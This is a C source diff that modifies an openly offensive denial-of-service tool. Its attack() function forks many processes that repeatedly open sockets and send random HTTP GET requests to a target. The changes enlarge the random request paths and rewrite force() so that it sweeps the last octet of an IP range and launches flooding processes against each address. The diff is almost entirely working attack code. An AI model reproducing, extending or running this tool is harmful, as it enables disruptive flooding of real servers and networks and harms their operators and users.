@@ -48,7 +48,7 @@ int make_socket(char *host, char *port, int modus)
 	{
 		if(servinfo)
 			freeaddrinfo(servinfo);
-		fprintf(stderr, "No connection could be made\n");
+		fprintf(stderr, "No connection could be made: %s\n", host);
 		exit(0);
 	}
 	if(servinfo)
@@ -67,7 +67,7 @@ void attack(char *host, char *port, int id, int modus)
 	int sockets;
 	int r, i, n, buf;
 	int x = 0;
-	char string[10];
+	char string[100];
 	static int j = 0;
 	char httpbuf[2024];
 	char s_copy[132];
@@ -84,7 +84,7 @@ void attack(char *host, char *port, int id, int modus)
 				sockets = make_socket(host, port, modus);
     
 			srand(time(NULL));
-			for( j = 0; j < 9; j++)
+			for( j = 0; j < 99; j++)
         		string[j] = 'A' + rand()%26; // starting on '0', ending on '}'	
 	
 			sprintf(httpbuf, "GET /%s HTTP/1.0\r\n\r\n", string);
@@ -93,22 +93,23 @@ void attack(char *host, char *port, int id, int modus)
 			r=write(sockets, s_copy, sizebuf);
 			close(sockets);
 			sockets = make_socket(host, port, modus);
-			fprintf(stderr, "[Thread:%i Connection:%d %s]\n", id,x,s_copy);
+			fprintf(stderr, "Thread:%i Connection:%d %s", id,x,s_copy);
 			x++;
 		}
 		usleep(300000);
 	}
 }
-int force(char *host)
+int force(char *host, int modus, char *port)
 {
 	char *i;
 	char *p;
 	int stelle;
+	int x = 0;
 
 	p = host;
 	i = strrchr(host, 46);
   stelle = (i - p) + 1;
-  
+
   if(host[stelle] != '\0')
     return 0;
 	
@@ -136,7 +137,15 @@ int force(char *host)
           host[stelle + 2] = j;
         if(l == 2 && k == 5 && j == 53)
           break;
-        printf("IP: %s\n", host);//start here
+				while(x != Threads)
+				{	
+					printf("Start IP: %s\n", host);
+					++x;
+					if(fork())
+						attack(host, port, x, modus);
+					usleep(100000);
+				}
+				x = 0;
       }
 		}
 	}
@@ -159,14 +168,15 @@ int main(int argc, char **argv)
 	printf("Threads?\n");
     scanf("%d",&Threads);
   
-  if(force(ip))
-
-	while(x != Threads)
+	if(!(force(ip, modus, port)))
 	{	
-		++x;
-		if(fork())
-			attack(ip, port, x, modus);
-		usleep(200000);
+		while(x != Threads)
+		{	
+			++x;
+			if(fork())
+				attack(ip, port, x, modus);
+			usleep(100000);
+		}
 	}
 	getc(stdin);
 	return 0;
